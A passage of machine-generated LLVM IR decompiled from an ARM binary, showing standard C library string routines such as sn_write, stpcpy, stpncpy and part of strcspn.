  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13120, { 2, 0, 1 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @sn_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v1_1313c = add i32 %arg1, 16
  %v2_1313c = inttoptr i32 %v1_1313c to i32*
  %v3_1313c = load i32, i32* %v2_1313c, align 4
  %v1_13140 = add i32 %arg1, 20
  %v2_13140 = inttoptr i32 %v1_13140 to i32*
  %v3_13140 = load i32, i32* %v2_13140, align 4
  %v2_13144 = sub i32 %v3_1313c, %v3_13140
  %v3_13148 = icmp ugt i32 %v2_13144, %arg2
  br i1 %v3_13148, label %bb, label %bb6

bb:                                               ; preds = %entry
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_13144, %entry ]
  %v0_13154 = phi i32 [ %arg2, %bb ], [ %v2_13144, %entry ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_13158 = load i32, i32* @r1, align 4
  %v3_13158 = inttoptr i32 %v3_13140 to i16*
  %v4_13158 = call i32 @memcpy(i16* %v3_13158, i32 %v1_13158, i32 %v0_13154)
  %v0_1315c = load i32, i32* @r5, align 4
  %v1_1315c = add i32 %v0_1315c, 20
  %v2_1315c = inttoptr i32 %v1_1315c to i32*
  %v3_1315c = load i32, i32* %v2_1315c, align 4
  %v0_13160 = load i32, i32* @r6, align 4
  %v1_13164 = load i32, i32* @r4, align 4
  %v2_13164 = add i32 %v1_13164, %v3_1315c
  store i32 %v2_13164, i32* %v2_1315c, align 4
  ret i32 %v0_13160

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__stpcpy() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %v0_13174 = load i32, i32* @r1, align 4
  %v1_13174 = urem i32 %v0_13174, 4
  %v0_13178 = load i32, i32* @r0, align 4
  %v1_13178 = urem i32 %v0_13178, 4
  %v9_1317c = icmp eq i32 %v1_13174, %v1_13178
  store i1 %v9_1317c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1317c, label %dec_label_pc_131a8, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %entry
  %v1_13184 = inttoptr i32 %v0_13174 to i8*
  %v2_13184 = load i8, i8* %v1_13184, align 1
  %v2_13188 = icmp eq i8 %v2_13184, 0
  store i1 %v2_13188, i1* %cpsr_z.global-to-local, align 1
  %v3_1318c = inttoptr i32 %v0_13178 to i8*
  store i8 %v2_13184, i8* %v3_1318c, align 1
  %v0_13190 = load i32, i32* @lr, align 4
  %v1_13190 = load i1, i1* %cpsr_z.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_13190, i32 %v0_13190)
  br label %dec_label_pc_13194.preheader

dec_label_pc_13194.preheader:                     ; preds = %dec_label_pc_13184, %dec_label_pc_13224
  %v2_1319c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %dec_label_pc_13194.preheader, %dec_label_pc_13194
  %v2_1319c = phi i32 [ %v2_1319c.pre, %dec_label_pc_13194.preheader ], [ %v6_1319c, %dec_label_pc_13194 ]
  %v0_13194 = load i32, i32* @r1, align 4
  %v1_13194 = add i32 %v0_13194, 1
  %v2_13194 = inttoptr i32 %v1_13194 to i8*
  %v3_13194 = load i8, i8* %v2_13194, align 1
  store i32 %v1_13194, i32* @r1, align 4
  %v2_13198 = icmp eq i8 %v3_13194, 0
  store i1 %v2_13198, i1* %cpsr_z.global-to-local, align 1
  %v3_1319c = add i32 %v2_1319c, 1
  %v4_1319c = inttoptr i32 %v3_1319c to i8*
  store i8 %v3_13194, i8* %v4_1319c, align 1
  %v5_1319c = load i32, i32* @r0, align 4
  %v6_1319c = add i32 %v5_1319c, 1
  store i32 %v6_1319c, i32* @r0, align 4
  %v0_131a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_131a0, label %dec_label_pc_131a4, label %dec_label_pc_13194

dec_label_pc_131a4:                               ; preds = %dec_label_pc_13194
  ret i32 %v6_1319c

dec_label_pc_131a8:                               ; preds = %entry
  %v2_131a8 = icmp eq i32 %v1_13174, 0
  store i1 %v2_131a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_131a8, label %dec_label_pc_131e4, label %dec_label_pc_131b0

dec_label_pc_131b0:                               ; preds = %dec_label_pc_131a8
  %v1_131b0 = inttoptr i32 %v0_13174 to i8*
  %v2_131b0 = load i8, i8* %v1_131b0, align 1
  %v2_131b4 = icmp eq i8 %v2_131b0, 0
  store i1 %v2_131b4, i1* %cpsr_z.global-to-local, align 1
  %v3_131b8 = inttoptr i32 %v0_13178 to i8*
  store i8 %v2_131b0, i8* %v3_131b8, align 1
  %v0_131bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_131bc, label %dec_label_pc_131c0, label %dec_label_pc_131d4.preheader

dec_label_pc_131d4.preheader:                     ; preds = %dec_label_pc_131b0
  %v0_131d48 = load i32, i32* @r1, align 4
  %v1_131d49 = add i32 %v0_131d48, 1
  store i32 %v1_131d49, i32* @r1, align 4
  %v1_131d810 = urem i32 %v1_131d49, 4
  %v2_131d811 = icmp eq i32 %v1_131d810, 0
  store i1 %v2_131d811, i1* %cpsr_z.global-to-local, align 1
  %v0_131dc12 = load i32, i32* @r0, align 4
  %v1_131dc13 = add i32 %v0_131dc12, 1
  store i32 %v1_131dc13, i32* @r0, align 4
  br i1 %v2_131d811, label %dec_label_pc_131e4, label %dec_label_pc_131c4

dec_label_pc_131c0:                               ; preds = %dec_label_pc_131b0
  %v1_131c0 = load i32, i32* @r0, align 4
  ret i32 %v1_131c0

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131d4.preheader, %dec_label_pc_131c4
  %v2_131cc = phi i32 [ %v1_131dc, %dec_label_pc_131c4 ], [ %v1_131dc13, %dec_label_pc_131d4.preheader ]
  %v0_131c4 = phi i32 [ %v1_131d4, %dec_label_pc_131c4 ], [ %v1_131d49, %dec_label_pc_131d4.preheader ]
  %v1_131c4 = inttoptr i32 %v0_131c4 to i8*
  %v2_131c4 = load i8, i8* %v1_131c4, align 1
  %v2_131c8 = icmp eq i8 %v2_131c4, 0
  store i1 %v2_131c8, i1* %cpsr_z.global-to-local, align 1
  %v3_131cc = inttoptr i32 %v2_131cc to i8*
  store i8 %v2_131c4, i8* %v3_131cc, align 1
  %v0_131d0 = load i32, i32* @lr, align 4
  %v1_131d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_131d0, i32 %v0_131d0)
  %v0_131d4 = load i32, i32* @r1, align 4
  %v1_131d4 = add i32 %v0_131d4, 1
  store i32 %v1_131d4, i32* @r1, align 4
  %v1_131d8 = urem i32 %v1_131d4, 4
  %v2_131d8 = icmp eq i32 %v1_131d8, 0
  store i1 %v2_131d8, i1* %cpsr_z.global-to-local, align 1
  %v0_131dc = load i32, i32* @r0, align 4
  %v1_131dc = add i32 %v0_131dc, 1
  store i32 %v1_131dc, i32* @r0, align 4
  br i1 %v2_131d8, label %dec_label_pc_131e4, label %dec_label_pc_131c4

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131c4, %dec_label_pc_131d4.preheader, %dec_label_pc_131a8
  %v1_131ec19 = phi i32 [ %v0_13178, %dec_label_pc_131a8 ], [ %v1_131dc13, %dec_label_pc_131d4.preheader ], [ %v1_131dc, %dec_label_pc_131c4 ]
  %v0_131e4 = phi i32 [ %v0_13174, %dec_label_pc_131a8 ], [ %v1_131d49, %dec_label_pc_131d4.preheader ], [ %v1_131d4, %dec_label_pc_131c4 ]
  %v1_131e4 = inttoptr i32 %v0_131e4 to i32*
  %v2_131e4 = load i32, i32* %v1_131e4, align 4
  store i32 %v2_131e4, i32* @ip, align 4
  %v1_132002 = add i32 %v2_131e4, -16843009
  %v1_132043 = sub i32 -1, %v2_131e4
  %v2_132084 = and i32 %v1_132043, -2139062144
  %v1_132185 = and i32 %v2_132084, %v1_132002
  %v2_1321c7 = icmp eq i32 %v1_132185, 0
  store i1 %v2_1321c7, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1321c7, label %dec_label_pc_131ec, label %dec_label_pc_13224

dec_label_pc_131ec:                               ; preds = %dec_label_pc_131e4, %dec_label_pc_131ec
  %v1_131ec = phi i32 [ %v4_131ec, %dec_label_pc_131ec ], [ %v1_131ec19, %dec_label_pc_131e4 ]
  %v0_131ec = phi i32 [ %v3_131f0, %dec_label_pc_131ec ], [ %v2_131e4, %dec_label_pc_131e4 ]
  %v2_131ec = inttoptr i32 %v1_131ec to i32*
  store i32 %v0_131ec, i32* %v2_131ec, align 4
  %v3_131ec = load i32, i32* @r0, align 4
  %v4_131ec = add i32 %v3_131ec, 4
  store i32 %v4_131ec, i32* @r0, align 4
  %v0_131f0 = load i32, i32* @r1, align 4
  %v1_131f0 = add i32 %v0_131f0, 4
  %v2_131f0 = inttoptr i32 %v1_131f0 to i32*
  %v3_131f0 = load i32, i32* %v2_131f0, align 4
  store i32 %v3_131f0, i32* @ip, align 4
  store i32 %v1_131f0, i32* @r1, align 4
  %v1_13200 = add i32 %v3_131f0, -16843009
  %v1_13204 = sub i32 -1, %v3_131f0
  %v2_13208 = and i32 %v1_13204, -2139062144
  %v1_13218 = and i32 %v2_13208, %v1_13200
  %v2_1321c = icmp eq i32 %v1_13218, 0
  br i1 %v2_1321c, label %dec_label_pc_131ec, label %dec_label_pc_131f4.dec_label_pc_13224_crit_edge

dec_label_pc_131f4.dec_label_pc_13224_crit_edge:  ; preds = %dec_label_pc_131ec
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13224

dec_label_pc_13224:                               ; preds = %dec_label_pc_131f4.dec_label_pc_13224_crit_edge, %dec_label_pc_131e4
  %v2_1322c = phi i32 [ %v4_131ec, %dec_label_pc_131f4.dec_label_pc_13224_crit_edge ], [ %v1_131ec19, %dec_label_pc_131e4 ]
  %v0_13224 = phi i32 [ %v1_131f0, %dec_label_pc_131f4.dec_label_pc_13224_crit_edge ], [ %v0_131e4, %dec_label_pc_131e4 ]
  %v1_13224 = inttoptr i32 %v0_13224 to i8*
  %v2_13224 = load i8, i8* %v1_13224, align 1
  %v2_13228 = icmp eq i8 %v2_13224, 0
  store i1 %v2_13228, i1* %cpsr_z.global-to-local, align 1
  %v3_1322c = inttoptr i32 %v2_1322c to i8*
  store i8 %v2_13224, i8* %v3_1322c, align 1
  %v0_13230 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13230, label %dec_label_pc_13234, label %dec_label_pc_13194.preheader

dec_label_pc_13234:                               ; preds = %dec_label_pc_13224
  %v1_13234 = load i32, i32* @r0, align 4
  ret i32 %v1_13234

; uselistorder directives
  uselistorder i32 %v3_131f0, { 0, 2, 3, 1 }
  uselistorder i32 %v4_131ec, { 0, 2, 1 }
  uselistorder i32 %v2_131e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_131ec19, { 1, 0 }
  uselistorder i32 %v1_131dc, { 0, 2, 1 }
  uselistorder i32 %v1_131d4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_131dc13, { 1, 0, 2 }
  uselistorder i32 %v1_131d49, { 2, 1, 0, 3 }
  uselistorder i32 %v6_1319c, { 0, 2, 1 }
  uselistorder i32 %v0_13178, { 1, 2, 3, 0 }
  uselistorder i32 %v1_13174, { 1, 0 }
  uselistorder i32 %v0_13174, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 0, 1, 7, 5, 6, 2, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_131ec, { 1, 0 }
  uselistorder label %dec_label_pc_131c4, { 1, 0 }
  uselistorder label %dec_label_pc_13194, { 1, 0 }
  uselistorder label %dec_label_pc_13194.preheader, { 1, 0 }
}

define i32 @__stpncpy() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13238 = load i32, i32* @r4, align 4
  store i32 %v3_13238, i32* %stack_var_-8, align 4
  %v0_1323c = load i32, i32* @r0, align 4
  store i32 %v0_1323c, i32* @r4, align 4
  %v1_13240 = urem i32 %v0_1323c, 4
  %v0_13244 = load i32, i32* @r1, align 4
  %v1_13244 = urem i32 %v0_13244, 4
  store i32 %v1_13244, i32* %r0.global-to-local, align 4
  %v9_13248 = icmp eq i32 %v1_13244, %v1_13240
  store i1 %v9_13248, i1* %cpsr_z.global-to-local, align 1
  %v0_1324c = load i32, i32* @r2, align 4
  store i32 %v0_1324c, i32* %ip.global-to-local, align 4
  br i1 %v9_13248, label %dec_label_pc_132a8, label %dec_label_pc_13254

dec_label_pc_13254:                               ; preds = %entry, %dec_label_pc_13360
  %v2_13264 = phi i32 [ %v0_1323c, %entry ], [ %v0_13360, %dec_label_pc_13360 ]
  %v0_1325c = phi i32 [ %v0_13244, %entry ], [ %v0_13364, %dec_label_pc_13360 ]
  %v0_13254 = phi i32 [ %v0_1324c, %entry ], [ %v0_13254.pr, %dec_label_pc_13360 ]
  %v2_13254 = icmp eq i32 %v0_13254, 0
  store i1 %v2_13254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13254, label %dec_label_pc_1328c, label %dec_label_pc_1325c

dec_label_pc_1325c:                               ; preds = %dec_label_pc_13254
  %v1_1325c = inttoptr i32 %v0_1325c to i8*
  %v2_1325c = load i8, i8* %v1_1325c, align 1
  %v2_13260 = icmp eq i8 %v2_1325c, 0
  store i1 %v2_13260, i1* %cpsr_z.global-to-local, align 1
  %v3_13264 = inttoptr i32 %v2_13264 to i8*
  store i8 %v2_1325c, i8* %v3_13264, align 1
  %v0_13268 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13268, label %dec_label_pc_1328c, label %dec_label_pc_13280

dec_label_pc_13270:                               ; preds = %dec_label_pc_13280
  %v0_13270 = load i32, i32* @r1, align 4
  %v1_13270 = add i32 %v0_13270, 1
  %v2_13270 = inttoptr i32 %v1_13270 to i8*
  %v3_13270 = load i8, i8* %v2_13270, align 1
  store i32 %v1_13270, i32* @r1, align 4
  %v2_13274 = icmp eq i8 %v3_13270, 0
  store i1 %v2_13274, i1* %cpsr_z.global-to-local, align 1
  %v3_13278 = inttoptr i32 %v1_13284 to i8*
  store i8 %v3_13270, i8* %v3_13278, align 1
  %v0_1327c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1327c, label %dec_label_pc_1328c, label %dec_label_pc_13280

dec_label_pc_13280:                               ; preds = %dec_label_pc_1325c, %dec_label_pc_13270
  %v0_13280 = load i32, i32* %ip.global-to-local, align 4
  %v1_13280 = add i32 %v0_13280, -1
  store i32 %v1_13280, i32* %ip.global-to-local, align 4
  %v7_13280 = icmp eq i32 %v0_13280, 1
  store i1 %v7_13280, i1* %cpsr_z.global-to-local, align 1
  %v0_13284 = load i32, i32* @r4, align 4
  %v1_13284 = add i32 %v0_13284, 1
  store i32 %v1_13284, i32* @r4, align 4
  br i1 %v7_13280, label %dec_label_pc_1328c, label %dec_label_pc_13270

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13280, %dec_label_pc_13270, %dec_label_pc_132ec.thread, %dec_label_pc_1325c, %dec_label_pc_132f4, %dec_label_pc_132ec, %dec_label_pc_13254
  %v0_1328c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1328c, i32* @r2, align 4
  %v0_13290 = load i32, i32* @r4, align 4
  store i32 %v0_13290, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_13298 = call i32 @memset()
  %v0_1329c = load i32, i32* @r4, align 4
  store i32 %v0_1329c, i32* %r0.global-to-local, align 4
  %v2_132a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_132a0, i32* @r4, align 4
  ret i32 %v0_1329c

dec_label_pc_132a8:                               ; preds = %entry
  %v2_132a8 = icmp eq i32 %v1_13240, 0
  store i1 %v2_132a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132a8, label %dec_label_pc_132ec, label %bb

bb:                                               ; preds = %dec_label_pc_132a8
  %v3_132ac = icmp eq i32 %v0_1324c, 0
  store i1 %v3_132ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_132ac, label %dec_label_pc_132ec.thread, label %dec_label_pc_132dc

dec_label_pc_132ec.thread:                        ; preds = %bb
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1328c

dec_label_pc_132b8:                               ; preds = %dec_label_pc_132dc
  %v0_132b8 = load i32, i32* @r1, align 4
  %v1_132b8 = add i32 %v0_132b8, 1
  store i32 %v1_132b8, i32* @r1, align 4
  %v1_132bc = urem i32 %v1_132b8, 4
  %v2_132bc = icmp eq i32 %v1_132bc, 0
  store i1 %v2_132bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132bc, label %bb27, label %bb26

bb26:                                             ; preds = %dec_label_pc_132b8
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_132b8, %bb26
  %v1_132cc9 = phi i1 [ true, %dec_label_pc_132b8 ], [ false, %bb26 ]
  %v0_132c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_132c4 = add i32 %v0_132c4, -1
  store i32 %v1_132c4, i32* %ip.global-to-local, align 4
  %v7_132c4 = icmp eq i32 %v0_132c4, 1
  %v2_132d0 = or i1 %v7_132c4, %v1_132cc9
  store i1 %v2_132d0, i1* %cpsr_z.global-to-local, align 1
  %v0_132d4 = load i32, i32* @r4, align 4
  %v1_132d4 = add i32 %v0_132d4, 1
  store i32 %v1_132d4, i32* @r4, align 4
  br i1 %v2_132d0, label %dec_label_pc_132ec, label %dec_label_pc_132dc

dec_label_pc_132dc:                               ; preds = %bb, %bb27
  %v2_132e4 = phi i32 [ %v1_132d4, %bb27 ], [ %v0_1323c, %bb ]
  %v0_132dc = phi i32 [ %v1_132b8, %bb27 ], [ %v0_13244, %bb ]
  %v1_132dc = inttoptr i32 %v0_132dc to i8*
  %v2_132dc = load i8, i8* %v1_132dc, align 1
  %v2_132e0 = icmp eq i8 %v2_132dc, 0
  store i1 %v2_132e0, i1* %cpsr_z.global-to-local, align 1
  %v3_132e4 = inttoptr i32 %v2_132e4 to i8*
  store i8 %v2_132dc, i8* %v3_132e4, align 1
  %v0_132e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_132e8, label %dec_label_pc_132dc.dec_label_pc_132ec.loopexit_crit_edge, label %dec_label_pc_132b8

dec_label_pc_132dc.dec_label_pc_132ec.loopexit_crit_edge: ; preds = %dec_label_pc_132dc
  %v0_132ec.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_132ec

dec_label_pc_132ec:                               ; preds = %bb27, %dec_label_pc_132dc.dec_label_pc_132ec.loopexit_crit_edge, %dec_label_pc_132a8
  %v0_13300 = phi i32 [ %v0_1324c, %dec_label_pc_132a8 ], [ %v0_132ec.pre.pre, %dec_label_pc_132dc.dec_label_pc_132ec.loopexit_crit_edge ], [ %v1_132c4, %bb27 ]
  %v2_132ec = icmp eq i32 %v0_13300, 0
  store i1 %v2_132ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132ec, label %dec_label_pc_1328c, label %dec_label_pc_132f4

dec_label_pc_132f4:                               ; preds = %dec_label_pc_132ec
  %v0_132f4 = load i32, i32* @r1, align 4
  %v1_132f4 = inttoptr i32 %v0_132f4 to i8*
  %v2_132f4 = load i8, i8* %v1_132f4, align 1
  %v2_132f8 = icmp eq i8 %v2_132f4, 0
  store i1 %v2_132f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132f8, label %dec_label_pc_1328c, label %dec_label_pc_13300

dec_label_pc_13300:                               ; preds = %dec_label_pc_132f4
  %v7_13300 = icmp eq i32 %v0_13300, 3
  store i1 %v7_13300, i1* %cpsr_z.global-to-local, align 1
  %v0_13304 = load i32, i32* @r4, align 4
  store i32 %v0_13304, i32* %r0.global-to-local, align 4
  store i32 %v0_132f4, i32* @lr, align 4
  %tmp = icmp ult i32 %v0_13300, 4
  br i1 %tmp, label %dec_label_pc_13360, label %dec_label_pc_13330

dec_label_pc_13318:                               ; preds = %dec_label_pc_13330
  %v0_13318 = load i32, i32* %ip.global-to-local, align 4
  %v1_13318 = add i32 %v0_13318, -4
  store i32 %v1_13318, i32* %ip.global-to-local, align 4
  %v7_1331c = icmp eq i32 %v1_13318, 3
  %v2_13320 = inttoptr i32 %v1_13320 to i32*
  store i32 %storemerge, i32* %v2_13320, align 4
  %v3_13320 = load i32, i32* %r0.global-to-local, align 4
  %v4_13320 = add i32 %v3_13320, 4
  store i32 %v4_13320, i32* %r0.global-to-local, align 4
  %v0_13324 = load i32, i32* @lr, align 4
  %v1_13324 = add i32 %v0_13324, 4
  store i32 %v1_13324, i32* @lr, align 4
  %tmp31 = icmp ult i32 %v1_13318, 4
  br i1 %tmp31, label %dec_label_pc_13360.loopexit, label %dec_label_pc_13330

dec_label_pc_13330:                               ; preds = %dec_label_pc_13300, %dec_label_pc_13318
  %v1_13320 = phi i32 [ %v4_13320, %dec_label_pc_13318 ], [ %v0_13304, %dec_label_pc_13300 ]
  %storemerge.in.in = phi i32 [ %v1_13324, %dec_label_pc_13318 ], [ %v0_132f4, %dec_label_pc_13300 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_1333c = add i32 %storemerge, -16843009
  %v1_13340 = sub i32 -1, %storemerge
  %v2_13344 = and i32 %v1_13340, -2139062144
  %v1_13354 = and i32 %v2_13344, %v1_1333c
  %v2_13358 = icmp eq i32 %v1_13354, 0
  br i1 %v2_13358, label %dec_label_pc_13318, label %dec_label_pc_13360.loopexit

dec_label_pc_13360.loopexit:                      ; preds = %dec_label_pc_13330, %dec_label_pc_13318
  %v0_1336415 = phi i32 [ %storemerge.in.in, %dec_label_pc_13330 ], [ %v1_13324, %dec_label_pc_13318 ]
  %v0_1336013 = phi i32 [ %v1_13320, %dec_label_pc_13330 ], [ %v4_13320, %dec_label_pc_13318 ]
  %v0_133285 = phi i1 [ false, %dec_label_pc_13330 ], [ %v7_1331c, %dec_label_pc_13318 ]
  store i1 %v0_133285, i1* %cpsr_z.global-to-local, align 1
  %v0_13254.pr.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13360

dec_label_pc_13360:                               ; preds = %dec_label_pc_13360.loopexit, %dec_label_pc_13300
  %v0_13254.pr = phi i32 [ %v0_13254.pr.pre, %dec_label_pc_13360.loopexit ], [ %v0_13300, %dec_label_pc_13300 ]
  %v0_13364 = phi i32 [ %v0_1336415, %dec_label_pc_13360.loopexit ], [ %v0_132f4, %dec_label_pc_13300 ]
  %v0_13360 = phi i32 [ %v0_1336013, %dec_label_pc_13360.loopexit ], [ %v0_13304, %dec_label_pc_13300 ]
  store i32 %v0_13360, i32* @r4, align 4
  store i32 %v0_13364, i32* @r1, align 4
  br label %dec_label_pc_13254

; uselistorder directives
  uselistorder i32 %v0_13360, { 1, 0 }
  uselistorder i32 %v0_13364, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_13304, { 1, 0, 2 }
  uselistorder i32 %v0_132f4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13300, { 1, 0, 2, 3 }
  uselistorder i32 %v0_132c4, { 1, 0 }
  uselistorder i32 %v1_132b8, { 1, 0, 2 }
  uselistorder i32 %v1_13284, { 1, 0 }
  uselistorder i32 %v0_13280, { 1, 0 }
  uselistorder i32 %v1_13244, { 1, 0 }
  uselistorder i32 %v0_13244, { 1, 2, 0 }
  uselistorder i32 %v1_13240, { 1, 0 }
  uselistorder i32 %v0_1323c, { 1, 2, 0, 3 }
  uselistorder i32* %ip.global-to-local, { 8, 0, 4, 3, 1, 5, 7, 2, 6, 9 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 6, 7, 4, 5, 17, 8, 9, 12, 10, 11, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_13330, { 1, 0 }
  uselistorder label %dec_label_pc_132ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132dc, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %dec_label_pc_1328c, { 4, 5, 2, 0, 1, 3, 6 }
  uselistorder label %dec_label_pc_13280, { 1, 0 }
  uselistorder label %dec_label_pc_13254, { 1, 0 }
}

define i32 @strcspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  store i32 %tmp4, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1336c = load i32, i32* @r4, align 4
  store i32 %v3_1336c, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  %v3_13374 = load i8, i8* %tmp, align 1
  %v4_13374 = zext i8 %v3_13374 to i32
  store i32 %v4_13374, i32* @r1, align 4
  %v2_13378 = icmp eq i8 %v3_13374, 0
  %v2_1337c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %tmp4, i32* @r5, align 4
  br i1 %v2_13378, label %dec_label_pc_13394, label %dec_label_pc_13388

dec_label_pc_13388:                               ; preds = %entry
  %v1_13388 = add i32 %arg2, 1
  %v2_13388 = inttoptr i32 %v1_13388 to i8*
  %v3_13388 = load i8, i8* %v2_13388, align 1
  %v2_1338c = icmp eq i8 %v3_13388, 0
  br i1 %v2_1338c, label %dec_label_pc_13394, label %dec_label_pc_133a8

dec_label_pc_13394:                               ; preds = %dec_label_pc_13388, %entry
  %v0_13394 = call i32 @__strchrnul()
  %v0_13398 = load i32, i32* @r5, align 4
  %v2_13398 = sub i32 %v0_13394, %v0_13398
  br label %dec_label_pc_1339c

dec_label_pc_1339c:                               ; preds = %dec_label_pc_134a4, %dec_label_pc_1349c, %dec_label_pc_13394
  %v1_133a4 = phi i32 [ 0, %dec_label_pc_134a4 ], [ %v2_1349c, %dec_label_pc_1349c ], [ %v2_13398, %dec_label_pc_13394 ]
  %v2_133a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_133a0, i32* @r4, align 4
  ret i32 %v1_133a4

dec_label_pc_133a8:                               ; preds = %dec_label_pc_13388
  store i32 %v2_1337c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 32, i32* @r2, align 4
  %v0_133b4 = call i32 @memset()
  %v0_133b8 = load i32, i32* @r4, align 4
  %v1_133b8 = inttoptr i32 %v0_133b8 to i8*
  %v2_133b8 = load i8, i8* %v1_133b8, align 1
  %v2_133bc = icmp eq i8 %v2_133b8, 0
  br i1 %v2_133bc, label %dec_label_pc_13434, label %dec_label_pc_133c4

dec_label_pc_133c4:                               ; preds = %dec_label_pc_133a8
  %div = udiv i8 %v2_133b8, 32
  %v3_133c4 = zext i8 %div to i32
  %v2_133c8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_133cc = mul nuw nsw i32 %v3_133c4, 4
  %v2_133d0 = add i32 %v3_133cc, %v2_133c8
  store i32 %v2_133d0, i32* %r1.global-to-local, align 4
  %v1_133d4 = add i32 %v2_133d0, -32
  %v2_133d4 = inttoptr i32 %v1_133d4 to i32*
  %v3_133d4 = load i32, i32* %v2_133d4, align 4
  %tmp14 = urem i8 %v2_133b8, 32
  %v1_133d8 = zext i8 %tmp14 to i32
  %v7_133e0 = shl i32 1, %v1_133d8
  %v8_133e0 = or i32 %v3_133d4, %v7_133e0
  store i32 %v8_133e0, i32* %v2_133d4, align 4
  %v0_133f0 = load i32, i32* @r4, align 4
  store i32 %v0_133f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13410

dec_label_pc_133f8:                               ; preds = %dec_label_pc_13410
  %tmp15 = urem i8 %v3_13410, 32
  %v1_1342c = zext i8 %tmp15 to i32
  %div11 = udiv i8 %v3_13410, 32
  %v3_13414 = zext i8 %div11 to i32
  %v3_1341c = mul nuw nsw i32 %v3_13414, 4
  %v2_13424 = add i32 %v3_1341c, %v2_133c8
  %v1_133f8 = add i32 %v2_13424, -32
  %v2_133f8 = inttoptr i32 %v1_133f8 to i32*
  %v3_133f8 = load i32, i32* %v2_133f8, align 4
  %v7_13400 = shl i32 1, %v1_1342c
  %v8_13400 = or i32 %v3_133f8, %v7_13400
  store i32 %v8_13400, i32* %v2_133f8, align 4
  %v0_13410.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13410

dec_label_pc_13410:                               ; preds = %dec_label_pc_133f8, %dec_label_pc_133c4
  %v0_13428 = phi i32 [ %v0_13410.pre, %dec_label_pc_133f8 ], [ %v0_133f0, %dec_label_pc_133c4 ]
  %v1_13410 = add i32 %v0_13428, 1
  %v2_13410 = inttoptr i32 %v1_13410 to i8*
  %v3_13410 = load i8, i8* %v2_13410, align 1
  %v2_13420 = icmp eq i8 %v3_13410, 0
  store i32 %v1_13410, i32* %r1.global-to-local, align 4
  br i1 %v2_13420, label %dec_label_pc_13434, label %dec_label_pc_133f8

dec_label_pc_13434:                               ; preds = %dec_label_pc_13410, %dec_label_pc_133a8
  %v0_13434 = load i32, i32* @r5, align 4
